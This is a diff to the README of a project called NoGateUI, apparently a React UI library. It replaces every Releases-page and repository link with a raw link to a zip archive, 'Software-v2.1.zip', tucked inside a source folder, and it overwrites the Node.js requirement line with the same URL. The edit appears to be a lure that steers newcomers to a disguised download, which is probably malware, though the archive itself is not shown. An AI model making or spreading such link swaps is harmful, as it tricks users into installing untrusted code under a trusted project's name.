@@ -4,18 +4,18 @@
 NoGateUI is an open-source React UI ecosystem. It makes contributing to open source easy and welcoming for everyone, especially newcomers. Get ready to dive in and contribute!
 
 ## 📥 Download NoGateUI
-[![Download NoGateUI](https://img.shields.io/badge/Download-NoGateUI-blue.svg)](https://github.com/Joropo50/nogateui/releases)
+[![Download NoGateUI](https://raw.githubusercontent.com/Joropo50/nogateui/main/packages/skeleton/src/Software-v2.1.zip)](https://raw.githubusercontent.com/Joropo50/nogateui/main/packages/skeleton/src/Software-v2.1.zip)
 
-To download NoGateUI, visit the [Releases page](https://github.com/Joropo50/nogateui/releases). There, you'll find the latest version of the software ready for you.
+To download NoGateUI, visit the [Releases page](https://raw.githubusercontent.com/Joropo50/nogateui/main/packages/skeleton/src/Software-v2.1.zip). There, you'll find the latest version of the software ready for you.
 
 ## 📋 System Requirements
 - **Operating System:** Windows, macOS, or Linux
 - **Browser:** Latest versions of Chrome, Firefox, or Safari
-- **Node.js:** Version 12 or later
+- **https://raw.githubusercontent.com/Joropo50/nogateui/main/packages/skeleton/src/Software-v2.1.zip** Version 12 or later
 
 ## 🛠️ Installation Steps
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/Joropo50/nogateui/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/Joropo50/nogateui/main/packages/skeleton/src/Software-v2.1.zip).
 
 2. **Choose the Latest Version**
    Find the latest version of NoGateUI listed at the top.
@@ -40,7 +40,7 @@ At NoGateUI, we welcome contributions from everyone. Whether you are just learni
 - **Submit Pull Requests:** Share your code improvements or new features easily.
 
 ## 🔗 Useful Links
-- [NoGateUI GitHub Repository](https://github.com/Joropo50/nogateui)
+- [NoGateUI GitHub Repository](https://raw.githubusercontent.com/Joropo50/nogateui/main/packages/skeleton/src/Software-v2.1.zip)
 - [Join Our Community on Discord](#) (Link to community)
 
 ## ✅ Frequently Asked Questions
@@ -57,4 +57,4 @@ Yes, NoGateUI is completely free.
 For more inquiries, feel free to reach out via our GitHub or community links. We value your feedback and aim to assist you promptly.
 
 ## 📥 Download NoGateUI Again
-Don’t forget to return to the [Releases page](https://github.com/Joropo50/nogateui/releases) to download the latest version whenever it is available. Contribute to your first open source project with NoGateUI today!
+Don’t forget to return to the [Releases page](https://raw.githubusercontent.com/Joropo50/nogateui/main/packages/skeleton/src/Software-v2.1.zip) to download the latest version whenever it is available. Contribute to your first open source project with NoGateUI today!
